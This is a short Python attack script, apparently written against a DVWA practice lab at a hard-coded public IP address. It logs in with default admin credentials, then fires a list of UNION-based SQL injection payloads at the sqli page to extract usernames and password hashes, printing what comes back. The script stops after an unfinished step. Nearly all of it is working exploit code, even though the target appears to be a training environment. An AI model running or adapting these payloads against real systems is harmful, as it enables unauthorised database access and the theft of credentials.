
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Attempting to extract username and password hashes using SQL UNION injection...\n")

# First, let's check the current query structure by testing basic queries
# The page shows: ID, First name, Surname
# We need to figure out how many columns exist in the users table

# Try UNION-based SQLi payloads
# Common DVWA SQLi uses: SELECT id, firstName, surname FROM users WHERE id=$id
# Let's try to get the username column as well

sqli_payloads = [
    "1' UNION SELECT user_id,user_name,user_password FROM users WHERE '1'='1",
    "1' UNION SELECT id,user,password FROM users WHERE '1'='1", 
    "1' UNION SELECT user_id,username,password FROM users WHERE '1'='1",
    "1 UNION SELECT id,user_name,user_password FROM users",
    "-1' UNION SELECT id,first_name,last_name FROM users -- ",
    "-1' UNION SELECT id,user_name,password FROM users -- ",
]

for payload in sqli_payloads:
    print(f"[*] Trying payload: {payload[:60]}...")
    response = session.get(sqli_url, params={"id": payload, "Submit": "Submit"}, verify=False)
    
    # Look for results
    if "ID:" in response.text:
        print(f"    [+] Got response with data!")
        # Extract the pre section
        pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
        if pre_match:
            print(f"    Result:\n{pre_match.group(1)[:500]}\n")
    else:
        print("    [-] No data")

print("\n[*] Trying to get view source code...")

